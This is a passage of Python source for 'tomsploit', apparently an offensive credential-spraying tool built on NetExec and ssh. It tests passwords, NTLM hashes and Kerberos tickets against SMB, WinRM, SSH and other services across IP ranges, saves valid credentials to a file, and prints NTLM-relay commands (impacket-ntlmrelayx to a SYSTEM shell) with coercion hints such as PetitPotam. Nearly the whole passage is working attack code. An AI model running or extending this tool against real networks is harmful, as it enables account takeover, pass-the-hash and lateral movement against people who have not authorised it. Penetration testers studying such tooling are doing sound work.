                  f"SMB/HTTP off first){RESET}")
            print(f"        impacket-ntlmrelayx -tf {targets_file} -smb2support")
            print(f"\n        {DIM}# relay straight to a SYSTEM shell on a target{RESET}")
            print(f"        impacket-ntlmrelayx -t smb://{relay_hosts[0][1]} "
                  f"-smb2support -i")
            print(f"\n        {DIM}# then trigger auth (coerce) toward your relay host{RESET}")
            print("        # e.g. PetitPotam / PrinterBug / a clicked UNC path")

        if show_failed:
            self.no_access_playbook(failed_hosts)

        if has_files:
            print(f"\n  {BOLD}Output files{RESET}")
            print(f"  {DIM}{'─' * 32}{RESET}")
            if self.cfg.creds_file:
                print(f"    {DIM}Valid creds (TSV):{RESET}  {self.cfg.creds_file}")
            if self.cfg.json_out:
                print(f"    {DIM}JSON results:     {RESET}  {self.cfg.json_out}")
            if self.cfg.log_file:
                print(f"    {DIM}scan log:         {RESET}  {self.cfg.log_file}")

        print(f"\n{'═' * BANNER_WIDTH}\n")


# ─── Input handling ────────────────────────────────────────────────────

_NT_HEX = re.compile(r"^[0-9a-fA-F]{32}$")
_LM_NT = re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")


def looks_like_ntlm(secret: str) -> bool:
    """True if the secret is an NTLM hash: 32 hex chars (NT) or LM:NT."""
    s = secret.strip()
    return bool(_NT_HEX.match(s) or _LM_NT.match(s))


def parse_combo_file(path: str) -> tuple[list[str], list[str], list[str], list[str]]:
    """Parse a combined 'user:secret' file into positionally-aligned lists.

    Each line is 'user:secret'. The secret is auto-classified: an NTLM hash
    (32 hex, or LM:NT) goes to hashes, anything else is treated as a password.
    Splitting on the FIRST colon only, so passwords may contain ':'.

    Returns (users, passwords, hashes, warnings) where users[i] aligns with
    whichever of passwords/hashes that line populated; the other list gets ''
    as a placeholder so all three stay the same length and paired zip works.
    """
    if not os.path.isfile(path):
        raise ValueError(f"--combo expects a file; '{path}' not found.")
    users: list[str] = []
    passwords: list[str] = []
    hashes: list[str] = []
    warnings: list[str] = []
    try:
        with open(path, encoding="latin-1") as f:
            lines = [ln.rstrip("\n") for ln in f]
    except OSError as exc:
        raise ValueError(f"Cannot read '{path}': {exc}") from exc

    for n, raw in enumerate(lines, 1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            warnings.append(f"line {n}: no ':' separator, skipped ({line!r})")
            continue
        user, secret = line.split(":", 1)
        user = user.strip()
        if not user:
            warnings.append(f"line {n}: empty username, skipped")
            continue
        users.append(user)
        if looks_like_ntlm(secret):
            hashes.append(secret.strip())
            passwords.append("")
        else:
            passwords.append(secret)
            hashes.append("")
    return users, passwords, hashes, warnings


def read_value_or_file(source: str, label: str = "") -> list[str]:
    """A value, or the contents of a file with that name.

    The file branch is announced on stderr: `-p Password123` silently reading
    a file that happens to be named Password123 in the cwd is a confusing five
    minutes, and one visible line removes it."""
    if os.path.isfile(source):
        try:
            # latin-1: maps every byte 0x00-0xFF to a char, so wordlists with
            # non-UTF-8 bytes (e.g. rockyou.txt) never raise UnicodeDecodeError.
            with open(source, encoding="latin-1") as f:
                vals = [line.strip() for line in f if line.strip()]
        except OSError as exc:
            raise ValueError(f"Cannot read '{source}': {exc}") from exc
        if label:
            print(f"{DIM}[*] {label}: read {len(vals)} line(s) from file "
                  f"'{source}'{RESET}", file=sys.stderr)
        return vals
    return [source]


def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
    """Expand IPs, hostnames, and CIDRs into a deduplicated, order-preserved
    list of hosts."""
    out: list[str] = []
    seen: set[str] = set()
    # Flatten comma lists so -t a,b,c works the same as it does in tombuster.
    flat = [item for raw in specs for item in str(raw).split(",")]
    for raw in flat:
        spec = raw.strip()
        if not spec:
            continue
        if "/" in spec:
            try:
                net = ipaddress.ip_network(spec, strict=False)
            except ValueError:
                if spec not in seen:
                    seen.add(spec); out.append(spec)
                continue
            if net.num_addresses > max_hosts:
                raise ValueError(
                    f"{spec} expands to {net.num_addresses} hosts "
                    f"(cap: {max_hosts}). Raise with --max-cidr-hosts."
                )
            hosts = ([net.network_address] if net.num_addresses == 1
                     else list(net.hosts()))
            for h in hosts:
                addr = str(h)
                if addr not in seen:
                    seen.add(addr); out.append(addr)
        else:
            if spec not in seen:
                seen.add(spec); out.append(spec)
    return out


def _is_ip_literal(spec: str) -> bool:
    """True for a bare IPv4/IPv6 address (as opposed to a hostname/FQDN)."""
    try:
        ipaddress.ip_address(spec.strip())
        return True
    except ValueError:
        return False


def parse_protocol_list(spec: str | None) -> list[str]:
    if not spec:
        return list(DEFAULT_PROTOCOLS)
    items = {s.strip().lower() for s in spec.split(",") if s.strip()}
    unknown = items - set(ALL_PROTOCOLS)
    if unknown:
        raise ValueError(
            f"Unknown protocol(s): {', '.join(sorted(unknown))}. "
            f"Valid: {', '.join(ALL_PROTOCOLS)}"
        )
    return [p for p in ALL_PROTOCOLS if p in items]


# ─── Port probe ────────────────────────────────────────────────────────

def tcp_probe(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=PORT_PROBE_TIMEOUT):
            return True
    except (OSError, socket.timeout):
        return False


def probe_protocols(host: str, protos: list[str]) -> list[str]:
    """Return protocols whose default port answers a TCP connect, in
    canonical order."""
    open_set: set[str] = set()
    with ThreadPoolExecutor(max_workers=10) as pool:
        futs = {pool.submit(tcp_probe, host, PROTOCOL_PORTS[p]): p for p in protos}
        for f in as_completed(futs):
            try:
                if f.result():
                    open_set.add(futs[f])
            except Exception:
                pass
    return [p for p in protos if p in open_set]


# ─── Credential file ───────────────────────────────────────────────────

CREDS_HEADER = (
    "# tomsploit valid credentials\n"
    "# target\tprotocol\tscope\tdomain\tuser\tauth_type\tsecret\tprivilege\ttimestamp\n"
)


def append_creds(path: str, result: TargetResult) -> None:
    if not result.successes:
        return
    is_new = not os.path.exists(path)
    now = datetime.now().isoformat(timespec="seconds")
    with open(path, "a") as f:
        if is_new:
            f.write(CREDS_HEADER)
        for s in result.successes:
            f.write("\t".join([
                result.real_ip or result.target,
                s.protocol, s.scope,
                s.domain or "-", s.user,
                s.auth_type.value, s.secret or "(ccache)",
                "admin" if s.is_admin else "user",
                now,
            ]) + "\n")


# ─── Orchestrator ──────────────────────────────────────────────────────

@dataclass
class _ProtoState:
    """Shared, lock-guarded state for one (protocol, scope) across all the
    credential attempts now running against it in parallel."""
    timeouts: int = 0
    aborted: bool = False


class TomSploit:
    def __init__(self, cfg: Config, reporter: Reporter):
        self.cfg = cfg
        self.reporter = reporter

        self.creds = self._build_creds()
        if not self.creds:
            raise ValueError("No credentials to test (need -p, -H, or -k).")
        self._check_spawn_budget()

        # Cancellation
        self._stop = threading.Event()
        self._procs_lock = threading.Lock()
        self._procs: set[subprocess.Popen] = set()

        # Progress
        self._progress_lock = threading.Lock()
        self._done = 0
        self._total = 0
        # Phase-aware progress. The scan phase has a known task count and shows
        # a real percentage; the enrichment phase (DC-only, variable number of
        # LDAP queries) can't be pre-counted, so it shows a labelled spinner
        # that advances as each query finishes and pulses while one runs — so
        # the bar never looks hung at 100% while enrichment works.
        self._phase = "scan"
        self._phase_label = ""
        self._phase_done = 0
        self._phase_total = 0

        # Per-(protocol, scope) timeout budget, shared across the parallel
        # attempts now running against each one.
        self._state_lock = threading.Lock()

        # Consolidated scan log (written once at the end). nxc is no longer
        # given --log: this nxc opens that path with mode "x" and crashes when
        # a second invocation reuses the name, so tomsploit captures every
        # command's output itself and writes a single log instead.
        self._log_lock = threading.Lock()

    def _check_spawn_budget(self) -> None:
        """Every attempt is a separate nxc process, and nxc costs 1-2s of
        Python startup before a packet moves. Fine for a handful of creds and
        catastrophic for a wordlist: 10 users x 10 passwords across 15
        (protocol, scope) tasks is 1,500 spawns ~ 40 minutes of pure overhead.
        Refuse rather than let it look like a hang."""
        tasks = tasks_per_target(self.cfg)
        total = len(self.creds) * tasks * len(self.cfg.targets)
        if total <= self.cfg.max_attempts or self.cfg.force:
            return
        mins = total * 1.5 / 60
        raise ValueError(
            f"{len(self.creds)} credential(s) × {tasks} protocol task(s) × "
            f"{len(self.cfg.targets)} target(s) = {total} nxc spawns "
            f"(~{mins:.0f} min of process startup alone, before any network "
            f"time).\n"
            f"  tomsploit sprays a known credential SET - for wordlists use "
            f"hydra, or nxc directly with -p <file>.\n"
            f"  To proceed anyway: --force. To narrow: --protocols smb,winrm  "
            f"or raise --max-attempts {total}.")

    def _build_creds(self) -> list[Cred]:
        cfg = self.cfg
        if cfg.kerberos:
            return [Cred(u, "", AuthType.KERBEROS) for u in cfg.users]
        if cfg.paired:
            return self._build_paired_creds()
        pairs: list[Cred] = []
        pairs += [Cred(u, p, AuthType.PASSWORD)
                  for u in cfg.users for p in cfg.passwords]
        pairs += [Cred(u, h, AuthType.HASH)
                  for u in cfg.users for h in cfg.hashes]
        return pairs

    def _build_paired_creds(self) -> list[Cred]:
        """Positional pairing: user[i] is tried only against secret[i], not
        every secret. Used after a dump where you already know which secret
        belongs to which user (e.g. usernames.txt + hashes.txt line-for-line,
        or a single user:secret --combo file). Length agreement is enforced
        in build_config(). Empty secrets are skipped: a --combo line populates
        only one of hashes/passwords and leaves '' in the other, so a blank
        here means 'this line was the other type', not a real credential."""
        cfg = self.cfg
        pairs: list[Cred] = []
        if cfg.hashes:
            pairs += [Cred(u, h, AuthType.HASH)
                      for u, h in zip(cfg.users, cfg.hashes) if h]
        if cfg.passwords:
            pairs += [Cred(u, p, AuthType.PASSWORD)
                      for u, p in zip(cfg.users, cfg.passwords) if p]
        return pairs

    def cancel(self) -> None:
        self._stop.set()
        with self._procs_lock:
            for proc in list(self._procs):
                try:
                    proc.terminate()
                except OSError:
                    pass

    # ── progress bar ─
    # Progress is decorative and goes to stderr. It is suppressed when stderr
    # is not a TTY (piped/redirected) so logs don't fill with \r escape noise,
    # and when --quiet is set.
    def _progress_enabled(self) -> bool:
        return sys.stderr.isatty() and not self.cfg.quiet

    _SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

    def _redraw(self) -> None:
        if not self._progress_enabled():
            return
        if self._phase == "enrich":
            self._spin_i = (getattr(self, "_spin_i", 0) + 1) % len(self._SPIN)
            frame = self._SPIN[self._spin_i]
            count = (f" {self._phase_done}/{self._phase_total}"
                     if self._phase_total else "")
            lbl = f" · {self._phase_label}" if self._phase_label else ""
            line = f"  {CYAN}{frame}{RESET} {DIM}enriching (DC){count}{lbl}{RESET} "
            self._last_progress_len = len(line)
            sys.stderr.write("\r" + line)
            sys.stderr.flush()
            return
        if self._total <= 0:
            return
        done = min(self._done, self._total)   # never report >100%
        pct = int(100 * done / self._total)
        bar_len = 20
        filled = min(bar_len, int(bar_len * done / self._total))
        bar = "█" * filled + "░" * (bar_len - filled)
        line = f"  {DIM}{bar} {pct:3d}% ({done}/{self._total}){RESET} "
        self._last_progress_len = len(line)
        sys.stderr.write("\r" + line)
        sys.stderr.flush()

    def _tick(self, n: int = 1) -> None:
        with self._progress_lock:
            self._done += n
            self._redraw()

    def _enter_enrich_phase(self, total: int, label: str) -> None:
        """Switch to the enrichment spinner and start a background pulse so the
        spinner animates even while a single slow LDAP query runs (the reason
        the bar looked hung at 100%)."""
        with self._progress_lock:
            self._phase = "enrich"
            self._phase_total = total
            self._phase_done = 0
            self._phase_label = label
            self._redraw()
        self._pulse_stop = threading.Event()

        def _pulse():
            while not self._pulse_stop.wait(0.2):
                if self._stop.is_set():
                    break
                with self._progress_lock:
                    if self._phase == "enrich":
                        self._redraw()
        self._pulse_thread = threading.Thread(target=_pulse, daemon=True)
        self._pulse_thread.start()

    def _enrich_step(self, label: str = "") -> None:
        with self._progress_lock:
            self._phase_done += 1
            if label:
                self._phase_label = label
            self._redraw()

    def _exit_enrich_phase(self) -> None:
        stop = getattr(self, "_pulse_stop", None)
        if stop is not None:
            stop.set()
        t = getattr(self, "_pulse_thread", None)
        if t is not None:
            t.join(timeout=1)
        with self._progress_lock:
            self._phase = "scan"
            self._phase_label = ""

    def _clear_progress(self) -> None:
        if not self._progress_enabled():
            return
        width = max(getattr(self, "_last_progress_len", 0), 70)
        sys.stderr.write("\r" + " " * width + "\r")
        sys.stderr.flush()

    def _say(self, msg: str) -> None:
        # Under --sh stdout is a shell script, so live hits go to stderr —
        # you still watch them scroll while `> next.sh` collects the commands.
        stream = sys.stderr if self.cfg.sh_only else sys.stdout
        with self._progress_lock:
            self._clear_progress()
            print(msg, file=stream, flush=True)
            self._redraw()

    # ── subprocess wrapper ─
    def _run_proc(self, cmd: list[str], timeout: float,
                  env: dict | None = None) -> tuple[str, str, bool]:
        """Run nxc/ssh. Returns (stdout, stderr, timed_out). Every invocation's
        output is appended to the consolidated scan log."""
        if self._stop.is_set():
            raise InterruptedError()
        try:
            # stdin is /dev/null: without it children inherit the terminal, so
            # anything that prompts blocks for the full timeout while silently
            # eating your keystrokes.
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.DEVNULL,
                                    text=True, env=env)
        except FileNotFoundError as exc:
            err = f"executable not found: {exc.filename}"
            self._log(cmd, "", err, False)
            return "", err, False
        with self._procs_lock:
            self._procs.add(proc)
        try:
            try:
                out, err = proc.communicate(timeout=timeout)
                self._log(cmd, out or "", err or "", False)
                return out or "", err or "", False
            except subprocess.TimeoutExpired:
                proc.kill()
                try:
                    proc.communicate(timeout=2)
                except subprocess.TimeoutExpired:
                    pass
                self._log(cmd, "", "", True)
                return "", "", True
        finally:
            with self._procs_lock:
                self._procs.discard(proc)

    def _log(self, cmd: list[str], stdout: str, stderr: str,
             timed_out: bool) -> None:
        """Append one command and its output to the in-memory scan log.

        No-op without -o: otherwise a long run buffers every byte of every
        command's output for the whole scan and then throws it away."""
        if not self.cfg.log_file:
            return
        rec = ["$ " + " ".join(shlex.quote(c) for c in cmd)]
        if timed_out:
            rec.append("  [timed out]")
        else:
            if stdout.strip():
                rec.append(stdout.rstrip())
            if stderr.strip():
                rec.append("[stderr] " + stderr.rstrip())
        # Appended to disk immediately rather than buffered until the end:
        # a buffered log is lost entirely on a hard kill, and it grew without
        # bound on a long run. Failures here are swallowed — logging must
        # never be able to break a scan.
        with self._log_lock:
            try:
                with open(self.cfg.log_file, "a") as f:
                    f.write("\n".join(rec) + "\n\n")
            except OSError:
                pass

    @staticmethod
    def _stderr_fallback(stdout: str, stderr: str) -> list[str]:
        """Stripped stderr lines, but only when stdout was empty (so we don't
        double-report). Used by every scan method."""
        if stdout or not stderr:
            return []
        return [ln.strip() for ln in stderr.split("\n") if ln.strip()]

    # ── one nxc invocation ─
    def _nxc_cmd(self, proto: str, target: str, cred: Cred,
                 local_auth: bool) -> list[str]:
        cmd = ["nxc", proto, target, "-u", cred.user]
        if cred.is_kerberos:
            cmd.append("--use-kcache")
        elif cred.is_hash:
            cmd.extend(["-H", cred.secret])
        else:
            cmd.extend(["-p", cred.secret])
        if local_auth:
            cmd.append("--local-auth")
        elif self.cfg.domain:
            # -d is meaningless (and contradictory) alongside --local-auth,
            # which authenticates against the machine's own SAM.
            cmd.extend(["-d", self.cfg.domain])
        cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
        return cmd

    # ── one (protocol, scope, credential) attempt ─
    #
    # The unit of parallelism used to be the (protocol, scope) PAIR, with every
    # credential run serially inside it. That put the concurrency on the wrong
    # axis: `--protocols smb` scheduled exactly two tasks, so 20 credentials
    # became 20 sequential nxc spawns (~1.5s of interpreter startup each) while
    # 13 of the 15 workers sat idle. Now each (protocol, scope, credential) is
    # its own task, so the pool is actually used.
    #
    # NOTE this raises the RATE of bad logons, not the count — the lockout
    # arithmetic in Reporter._attempts_per_user is unchanged — but a lockout
    # window is wall-clock, so a tight threshold trips sooner. The pre-spray
    # --pass-pol warning still fires first.

    def _scan_attempt(self, proto: str, target: str, cred: Cred,
                      local_auth: bool, state: "_ProtoState"
                      ) -> tuple[str, list[tuple[str, str]], list[Success]]:
        """One nxc invocation. Returns (protocol_key, lines, successes).

        Always ticks exactly once, on every exit path, so the progress bar
        can't drift or stall."""
        key = f"{proto}-{'local' if local_auth else 'domain'}"
        scope_label = "local" if local_auth else "domain"
        lines: list[tuple[str, str]] = []
        successes: list[Success] = []
        seen_keys: set[tuple] = set()

        if self._stop.is_set():
            self._tick()
            return key, lines, successes

        # This (protocol, scope) already gave up after repeated timeouts;
        # don't spend another 45s proving it again.
        with self._state_lock:
            if state.aborted:
                self._tick()
                return key, lines, successes

        cmd = self._nxc_cmd(proto, target, cred, local_auth)
        try:
            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
        except InterruptedError:
            self._tick()
            return key, lines, successes

        if timed_out:
            self._tick()
            # "Consecutive" no longer means anything once attempts run in
            # parallel, so this is now simply a per-(protocol, scope) budget:
            # after N timeouts, stop scheduling more against it. Attempts
            # already in flight finish; the queued ones short-circuit above.
            with self._state_lock:
                state.timeouts += 1
                just_aborted = (state.timeouts >= MAX_CONSECUTIVE_TIMEOUTS
                                and not state.aborted)
                if just_aborted:
                    state.aborted = True
            if just_aborted:
                lines.append(("[!]", f"{MAX_CONSECUTIVE_TIMEOUTS} timeouts — "
                                     f"remaining attempts skipped"))
                self._say(f"  {YELLOW}⏱ {proto.upper()} ({scope_label}){RESET} "
                          f"{DIM}repeated timeouts — skipping{RESET}")
            return key, lines, successes

        for raw in stdout.split("\n"):
            marker, msg = parse_nxc_line(raw.strip())
            if marker == "[*]":
                # STORED as well as captured. The [*] line is the only
                # place nxc reports name:/domain:/signing:, and dropping
                # it here is what left SMB-signing (relay) detection and
                # the LDAP DC signal reading from an empty list.
                lines.append((marker, msg))
            elif marker == "[+]":
                # Kerberos successes carry no secret, so the strict colon
                # rule has to be relaxed for them (and ONLY for them).
                if not is_auth_success(msg, cred.user,
                                       allow_secretless=cred.is_kerberos):
                    # A [+] that isn't a clean auth success. Usually it's
                    # benign module output ("Dumped 5 objects"), but it
                    # could be a real success in a shape we don't parse
                    # (nxc format drift, an unusual protocol response).
                    # If it looks credential-ish, flag it for manual
                    # review with [?] instead of silently treating it as
                    # noise; otherwise show it plainly.
                    if looks_like_possible_success(msg, cred.user):
                        lines.append(("[?]", msg))
                        self._say(f"  {YELLOW}{BOLD}? {proto.upper()} "
                                  f"({scope_label}){RESET} {YELLOW}{msg}"
                                  f"{RESET} {DIM}← verify manually{RESET}")
                    else:
                        lines.append((marker, msg))
                    continue
                domain, user, secret, is_admin, is_guest = \
                    parse_success_message(msg)
                user = user or cred.user
                if not secret:
                    # Kerberos legitimately has no secret (the ccache IS the
                    # credential); for password/hash this backfills a shape
                    # we didn't fully parse.
                    secret = cred.secret
                success = Success(
                    protocol=proto, local_auth=local_auth,
                    domain=domain, user=user, secret=secret,
                    auth_type=cred.auth_type,
                    is_admin=is_admin, is_guest=is_guest,
                    raw_message=msg,
                )
                if success.dedup_key in seen_keys:
                    continue
                seen_keys.add(success.dedup_key)
                lines.append((marker, msg))
                successes.append(success)
                color = YELLOW if is_guest else GREEN
                tag = " [Guest]" if is_guest else ""
                self._say(f"  {color}{BOLD}⚡ {proto.upper()} "
                          f"({scope_label}){RESET} {color}{msg}{tag}{RESET}")
            elif marker in ("[-]", "[!]"):
                lines.append((marker, msg))

        for raw in self._stderr_fallback(stdout, stderr):
            lines.append(("[-]", raw))

        self._tick()
        return key, lines, successes

    def _scan_ssh_task(self, target: str
                       ) -> tuple[str, list[tuple[str, str]], list[Success]]:
        """SSH stays ONE task rather than one-per-credential: it carries
        sequential state across attempts (the legacy-algorithm flip, the
        one-shot 'sshpass missing' warning) that would race if split up.
        Adapts _scan_ssh's return shape to match _scan_attempt's."""
        lines, successes, _tinfo = self._scan_ssh(target)
        return "ssh-domain", lines, successes

    # ── SSH via the real ssh client (not nxc's module) ─
    _SSH_MARKER = "TOMSPLOIT_SSH_OK"

    def _scan_ssh(self, target: str
                  ) -> tuple[list[tuple[str, str]], list[Success], str]:
        """Attempt SSH logins with the actual OpenSSH client (sshpass for
        passwords), so results match what a real `ssh user@host` does rather
        than nxc's paramiko handler. Same return shape as _scan_protocol.

        A login counts as success only if ssh exits 0 AND our marker comes
        back on stdout — proving a real shell executed a command, not just a
        banner/keyboard-interactive prompt. Connection failures (refused,
        unreachable, host-key) are reported separately from auth failures so
        a dead host is never shown as 'wrong password'."""
        lines: list[tuple[str, str]] = []
        successes: list[Success] = []
        seen_keys: set[tuple] = set()
        target_info = ""

        if not shutil.which("ssh"):
            lines.append(("[!]", "ssh client not found — cannot test SSH"))
            self._say(f"  {YELLOW}⚠ SSH{RESET} {DIM}ssh client not on PATH — "
                      f"skipping SSH{RESET}")
            self._tick(len(self.creds))
            return lines, successes, target_info

        have_sshpass = shutil.which("sshpass") is not None
        warned_no_sshpass = False
        legacy_mode = False   # flipped (once) when an old server rejects modern algos

        for idx, cred in enumerate(self.creds):
            if self._stop.is_set():
                self._tick(len(self.creds) - idx)
                break

            # A hash genuinely can't authenticate to OpenSSH — skip it.
            if cred.is_hash:
                self._tick(); continue

            # Kerberos: authenticate with the ticket cache via GSSAPI, no
            # password and no sshpass. This is the AD-joined-Linux path
            # (sshd with GSSAPIAuthentication yes) — the ticket in $KRB5CCNAME
            # is the credential.
            if cred.is_kerberos:
                self._scan_ssh_gssapi(target, cred, lines, successes,
                                      seen_keys)
                self._tick(); continue

            if not have_sshpass:
                if not warned_no_sshpass:
                    lines.append(("[!]", "sshpass not found — install it "
                                  "(apt install sshpass) to test SSH passwords"))
                    self._say(f"  {YELLOW}⚠ SSH{RESET} {DIM}sshpass not "
                              f"installed — skipping SSH password tests "
                              f"(apt install sshpass){RESET}")
                    warned_no_sshpass = True
                self._tick(); continue

            # sshpass reads the password from $SSHPASS rather than argv: with
            # -p it sits in the process table for any local user to `ps`.
            ssh_env = {**os.environ, "SSHPASS": cred.secret}
            cmd = self._ssh_cmd(target, cred.user, legacy=legacy_mode)
            try:
                stdout, stderr, timed_out = self._run_proc(
                    cmd, SUBPROCESS_TIMEOUT, env=ssh_env)
            except InterruptedError:
                break

            label = f"{cred.user}:{cred.secret}"
            if timed_out:
                lines.append(("[-]", f"{label} — connection timed out"))
                self._tick(); continue

            combined = f"{stdout}\n{stderr}"

            # Old SSH server? The first time negotiation fails, switch this
            # target to legacy algorithms and retry the same cred — otherwise a
            # reachable but ancient box gets ZERO passwords tested. The flag
            # sticks so the rest of the creds reuse legacy mode automatically.
            if (not legacy_mode and self._SSH_MARKER not in stdout
                    and self._ssh_is_negotiation_error(combined)):
                legacy_mode = True
                self._say(f"  {YELLOW}↻ SSH{RESET} {DIM}algorithm negotiation "
                          f"failed — retrying with legacy algorithms{RESET}")
                try:
                    stdout, stderr, timed_out = self._run_proc(
                        self._ssh_cmd(target, cred.user, legacy=True),
                        SUBPROCESS_TIMEOUT, env=ssh_env)
                except InterruptedError:
                    break
                if timed_out:
                    lines.append(("[-]", f"{label} — connection timed out"))
                    self._tick(); continue
                combined = f"{stdout}\n{stderr}"

            if self.cfg.debug:
                self._say(f"  {DIM}[ssh debug] {' '.join(cmd[3:])}{RESET}")
                self._say(f"  {DIM}[ssh debug] stdout={stdout!r}{RESET}")
                self._say(f"  {DIM}[ssh debug] stderr={stderr!r}{RESET}")

            if self._SSH_MARKER in stdout:
                # Genuine shell access.
                success = Success(
                    protocol="ssh", local_auth=False,
                    domain="", user=cred.user, secret=cred.secret,
                    auth_type=cred.auth_type, is_admin=False, is_guest=False,
                    raw_message=f"{cred.user}:{cred.secret} (ssh login OK)",
                )
                if success.dedup_key not in seen_keys:
                    seen_keys.add(success.dedup_key)
                    lines.append(("[+]", success.raw_message))
                    successes.append(success)
                    self._say(f"  {GREEN}{BOLD}⚡ SSH{RESET} "
                              f"{GREEN}{cred.user}:{cred.secret} "
                              f"(real ssh login){RESET}")
            elif self._ssh_is_conn_error(combined):
                # Not an auth result — host/network problem; report once-ish.
                reason = self._ssh_conn_reason(combined)
                lines.append(("[-]", f"{label} — {reason}"))
            else:
                # Reached the service, auth was rejected.
                lines.append(("[-]", f"{label} — auth failed"))

            self._tick()
        return lines, successes, target_info

    def _scan_ssh_gssapi(self, target: str, cred: "Cred",
                         lines: list, successes: list,
                         seen_keys: set) -> None:
        """Attempt an SSH login with a Kerberos ticket (GSSAPI), for
        AD-joined Linux hosts running `GSSAPIAuthentication yes`.

        No password, no sshpass — the credential is the TGT in $KRB5CCNAME,
        exactly the cache -k already relies on for the nxc protocols. Success
        is proven the same way the password path proves it: the marker must
        come back on stdout, so a banner or a prompt can't read as a shell.

        Requires a ticket cache to exist; if KRB5CCNAME is unset and no
        default cache is present, ssh has nothing to present and the attempt
        fails cleanly with a one-line explanation rather than a false negative.
        """
        # A principal is needed for the SSH username. Prefer the cred's user;
        # if it carries a realm (user@REALM) keep only the shortname for the
        # -l login name, since the realm belongs to Kerberos, not the OS user.
        login = cred.user.split("@", 1)[0] if cred.user else cred.user
        if not login:
            lines.append(("[!]", "kerberos SSH: no username to log in as"))
            return

        # Confirm a ticket cache actually exists before spending a connection
        # on it. klist -s is silent and returns non-zero when there are no
        # valid tickets; if klist isn't installed we fall through and let ssh
        # try, so a missing klist never blocks a working setup.
        if shutil.which("klist"):
            try:
                rc = subprocess.run(["klist", "-s"], stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL,
                                    stdin=subprocess.DEVNULL, timeout=5).returncode
            except (OSError, subprocess.SubprocessError):
                rc = 0   # klist misbehaved — don't block, let ssh decide
            if rc != 0:
                lines.append(("[!]", f"{login} (kerberos) — no valid ticket in "
                              f"cache (run kinit; check KRB5CCNAME)"))
                return

        cmd = self._ssh_gssapi_cmd(target, login)
        # Pass the caller's environment through so $KRB5CCNAME (and any custom
        # cache path the operator exported) reaches ssh unchanged.
        try:
            stdout, stderr, timed_out = self._run_proc(
                cmd, SUBPROCESS_TIMEOUT, env=dict(os.environ))
        except InterruptedError:
            return

        combined = f"{stdout}\n{stderr}"
        if self.cfg.debug:
            self._say(f"  {DIM}[ssh -k debug] {' '.join(cmd[1:])}{RESET}")
            self._say(f"  {DIM}[ssh -k debug] out={stdout!r} err={stderr!r}{RESET}")

        if timed_out:
            lines.append(("[-]", f"{login} (kerberos) — connection timed out"))
            return

        if self._SSH_MARKER in stdout:
            success = Success(
                protocol="ssh", local_auth=False, domain="",
                user=login, secret="", auth_type=AuthType.KERBEROS,
                is_admin=False, is_guest=False,
                raw_message=f"{login} (kerberos GSSAPI login OK)")
            if success.dedup_key not in seen_keys:
                seen_keys.add(success.dedup_key)
                lines.append(("[+]", success.raw_message))
                successes.append(success)
                self._say(f"  {GREEN}{BOLD}⚡ SSH{RESET} {GREEN}{login} "
                          f"(kerberos ticket){RESET}")
            return

        # No marker → distinguish "no ticket" / "server refused GSSAPI" /
        # "connection problem" so the line is actionable, not just "failed".
        low = combined.lower()
        # Ticket/credential problems (as opposed to the host rejecting a valid
        # ticket). Explicit phrases only — no bare "gss"+"no " heuristic, which
        # both mis-grouped by operator precedence and matched unrelated lines.
        ticket_signals = (
            "no credentials cache", "credentials cache file",
            "no kerberos credentials", "no credentials available",
            "can't find client principal", "server not found in kerberos",
            "clock skew", "ticket expired", "credential expired",
        )
        if any(sig in low for sig in ticket_signals):
            lines.append(("[!]", f"{login} (kerberos) — ticket problem "
                          f"(run kinit; check KRB5CCNAME / clock skew)"))
        elif self._ssh_is_conn_error(combined):
            lines.append(("[-]", f"{login} (kerberos) — "
                          f"{self._ssh_conn_reason(combined)}"))
        elif ("permission denied" in low or "authentications that can continue"
              in low):
            # Reached sshd; GSSAPI was offered/attempted and rejected. Usually
            # means the host isn't accepting this principal, or GSSAPI is off.
            lines.append(("[-]", f"{login} (kerberos) — GSSAPI rejected "
                          f"(host may not accept this principal, or "
                          f"GSSAPIAuthentication is off)"))
        else:
            lines.append(("[-]", f"{login} (kerberos) — auth failed"))

    @staticmethod
    def _ssh_gssapi_cmd(target: str, login: str) -> list[str]:
        """ssh invocation for Kerberos/GSSAPI auth. No sshpass: the ticket in
        the cache is the credential. Restricts auth to gssapi-with-mic so a
        host that also offers passwords can't turn this into a hanging
        password prompt, and runs the marker so success means a real shell.

        No credential delegation: this only proves the ticket authenticates,
        so it never forwards the TGT to the target."""
        marker = TomSploit._SSH_MARKER
        return [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GlobalKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-o", "GSSAPIAuthentication=yes",
            # Deliberately NOT delegating (no -K / GSSAPIDelegateCredentials).
            # This is a validation probe: forwarding the TGT onto the target
            # would leave your ticket harvestable there if the host is logging
            # or compromised, for no benefit — we only need to prove auth works.
            "-o", "GSSAPIDelegateCredentials=no",
            # gssapi-keyex first (key-exchange GSSAPI, used by some ADs),
            # then gssapi-with-mic; NOTHING else, so no password fallback.
            "-o", "PreferredAuthentications=gssapi-keyex,gssapi-with-mic",
            "-o", "PubkeyAuthentication=no",
            "-o", "PasswordAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no",
            "-o", "BatchMode=yes",
            "-o", "LogLevel=ERROR",
            f"{login}@{target}",
            f"echo {marker}",
        ]

    # Legacy algorithm options, appended on a negotiation-failure retry so an
    # old SSH server (only offering ssh-rsa host keys / SHA-1 KEX / CBC ciphers,
    # which modern OpenSSH disables by default) still gets its passwords tested
    # instead of being written off as "negotiation failed".
    _SSH_LEGACY_OPTS = [
        "-o", "HostKeyAlgorithms=+ssh-rsa,ssh-dss",
        "-o", ("KexAlgorithms=+diffie-hellman-group1-sha1,"
               "diffie-hellman-group14-sha1,"
               "diffie-hellman-group-exchange-sha1"),
        "-o", "Ciphers=+aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc",
